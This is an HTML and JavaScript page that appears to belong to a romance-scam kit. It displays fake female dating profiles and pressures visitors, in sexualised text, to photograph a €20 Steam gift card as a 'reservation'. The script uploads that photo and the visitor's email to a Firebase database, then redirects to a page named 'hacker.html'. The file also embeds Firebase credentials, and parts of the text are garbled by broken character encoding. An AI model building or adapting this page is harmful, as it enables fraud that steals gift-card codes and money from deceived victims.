<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Validation de RÃ©servation</title>

  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

  <style>
    body { margin: 0; font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; color: #1c1e21; }
    .scan-container { max-width: 420px; margin: 30px auto; background: white; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.15); }
    
    .chat-img { width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #28a745; margin-bottom: 15px; }
    h2 { color: #d32f2f; margin-bottom: 10px; font-size: 24px; }
    #chatDesc { font-size: 14px; line-height: 1.5; color: #555; margin-bottom: 20px; }

    #preview { display: none; width: 100%; border-radius: 12px; margin-top: 15px; border: 2px solid #007bff; max-height: 250px; object-fit: contain; }
    
    .btn { width: 100%; padding: 15px; margin-top: 15px; font-size: 16px; border-radius: 12px; border: none; color: white; cursor: pointer; font-weight: bold; transition: 0.3s; }
    .scanner-btn { background: #28a745; }
    .scanner-btn:hover { background: #218838; }
    .validate-btn { background: #007bff; display: none; }
    .validate-btn:hover { background: #0069d9; }
    .validate-btn:disabled { background: #ccc; cursor: not-allowed; }

    .loading-text { display: none; margin-top: 20px; font-size: 15px; }
    .success-msg { color: #28a745; font-weight: bold; animation: pop 0.4s ease-out; }
    @keyframes pop { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
  </style>
</head>

<body>

  <div class="scan-container">
    <img id="chatImage" src="" alt="Profil" class="chat-img">
    <h2 id="chatName">Chargement'.".".'</h2>
    <p id="chatDesc">ðŸ« ðŸ˜˜ðŸ«¦ðŸ‘… B4re continue mak sure 2 scan 1 steam pic's contain â‚¬20 4r reservation instead i'll 9ver reply u my kinky ðŸ¥µðŸ¥µ</p>

    <button id="scanBtn" class="btn scanner-btn">ðŸ“· SCANN A PHOTO</button>
    <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none;">
    
    <img id="preview" src="" alt="AperÃ§u du scan">
    
    <button id="validateBtn" class="btn validate-btn">VALIDATE & CONNECT</button>
    
    <div id="loading" class="loading-text">
        <span id="loadStatus">sent to secured server...</span>
    </div>
  </div>

<script>
  
// ==== CONFIGURATION FIREBASE ====
const firebaseConfig = {
  apiKey: "AIzaSyDIuRM5Eo6IVG_ghspnIQMcmAabgfcCn7k",
  authDomain: "meet-ur-night-s-dominator.firebaseapp.com",
  projectId: "meet-ur-night-s-dominator",
  storageBucket: "meet-ur-night-s-dominator.firebasestorage.app",
  messagingSenderId: "1021669198456",
  appId: "1:1021669198456:web:31a62bb6003888060afb8d",
  measurementId: "G-SFPWNFM8PY",
  databaseURL: "https://meet-ur-night-s-dominator-default-rtdb.europe-west1.firebasedatabase.app"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const params = new URLSearchParams(window.location.search);
const imgNum = params.get("img");
const email = params.get("email");

if (!imgNum || !email) { window.location.href = "home.html"; }

const profils = { 1: "Alessia", 2: "Alice", 3: "Angela", 4: "Arianna", 5: "Aurora", 6: "Beatrice", 7: "Benedetta", 8: "Bianca", 9: "Camilla", 10: "Carla", 11: "Carlotta", 12: "Caterina", 13: "Chiara", 14: "Claudia", 15: "Cristina", 16: "Daniela", 17: "Deborah", 18: "Denise", 19: "Diana", 20: "Elena", 21: "Eleonora", 22: "Elisa", 23: "Elisabetta", 24: "Emma", 25: "Federica", 26: "Francesca", 27: "Gabriella", 28: "Gaia", 29: "Giada", 30: "Giulia", 31: "Giorgia", 32: "Ilaria", 33: "Isabella", 34: "Laura", 35: "Lavinia", 36: "Lea", 37: "Letizia", 38: "Lidia", 39: "Lorenza", 40: "Lucia", 41: "Lucrezia", 42: "Ludovica", 43: "Manuela", 44: "Mara", 45: "Margherita", 46: "Maria", 47: "Marianna", 48: "Martina", 49: "Matilde", 50: "Michela", 51: "Miriam", 52: "Monica", 53: "Nadia", 54: "Nicole", 55: "Nicoletta", 56: "Noemi", 57: "Paola", 58: "Patrizia", 59: "Rebecca", 60: "Roberta", 61: "Rosa", 62: "Rosalia", 63: "Sabrina", 64: "Samantha", 65: "Sara", 66: "Serena", 67: "Silvia", 68: "Simona", 69: "Sofia", 70: "Sonia", 71: "Stefania", 72: "Stella", 73: "Susanna", 74: "Teresa", 75: "Valentina", 76: "Valeria", 77: "Vanessa", 78: "Veronica", 79: "Viola", 80: "Virginia", 81: "Viviana", 82: "Agata", 83: "Anita", 84: "Antonella", 85: "Asia", 86: "Bruna", 87: "Carmen", 88: "Carina", 89: "Cinzia", 90: "Costanza", 91: "Dafne", 92: "Emanuela", 93: "Fiorella", 94: "Gabriela", 95: "Gemma", 96: "Iolanda", 97: "Lara", 98: "Melissa", 99: "Rosanna", 100: "Stefania" };

document.getElementById("chatImage").src = `IMAGE/img${imgNum}.jpg`;
document.getElementById("chatName").textContent = profils[imgNum] || "Ma ChÃ©rie";

const scanBtn = document.getElementById("scanBtn");
const cameraInput = document.getElementById("cameraInput");
const preview = document.getElementById("preview");
const validateBtn = document.getElementById("validateBtn");
const loading = document.getElementById("loading");
const loadStatus = document.getElementById("loadStatus");

scanBtn.onclick = () => cameraInput.click();

cameraInput.onchange = () => {
  const file = cameraInput.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = (e) => {
    const img = new Image();
    img.onload = () => {
      // --- COMPRESSION DE L'IMAGE ---
      const canvas = document.createElement('canvas');
      const MAX_WIDTH = 600; // On rÃ©duit la taille pour Firebase
      let width = img.width;
      let height = img.height;

      if (width > MAX_WIDTH) {
        height *= MAX_WIDTH / width;
        width = MAX_WIDTH;
      }
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(img, 0, 0, width, height);
      
      // On transforme en JPEG qualitÃ© moyenne (0.6) pour que ce soit lÃ©ger
      const dataUrl = canvas.toDataURL("image/jpeg", 0.6);
      preview.src = dataUrl;
      preview.style.display = "block";
      validateBtn.style.display = "block";
      scanBtn.style.display = "none";
    };
    img.src = e.target.result;
  };
  reader.readAsDataURL(file);
};

validateBtn.onclick = async () => {
  validateBtn.disabled = true;
  loading.style.display = "block";
  
  // Nettoyage complet de l'email pour Firebase (interdit les points et @)
  const userKey = email.replace(/[.@]/g, '_');
  const convKey = imgNum + "_" + userKey;

  try {
    // 1. Envoi Ã  la branche Scans
    await db.ref("scans/" + userKey).set({
      scanPhoto: preview.src,
      userEmail: email,
      profilId: imgNum,
      timestamp: firebase.database.ServerValue.TIMESTAMP
    });

    // 2. Envoi du premier message
    await db.ref("messages/" + convKey).push({
      from: "user",
      message: "Coupon Sent âœ…",
      date: new Date().toLocaleString()
    });

    loadStatus.innerHTML = "<span class='success-msg'>âœ… TRANSFER SUCCESSFUL!</span><br>Redirecting...";
    
    setTimeout(() => {
      window.location.href = `hacker.html?img=${imgNum}&email=${encodeURIComponent(email)}`;
    }, 1500);

  } catch (error) {
    console.error(error);
    alert("Database Error: " + error.message);
    validateBtn.disabled = false;
    loading.style.display = "none";
  }
};

</body>
</html>
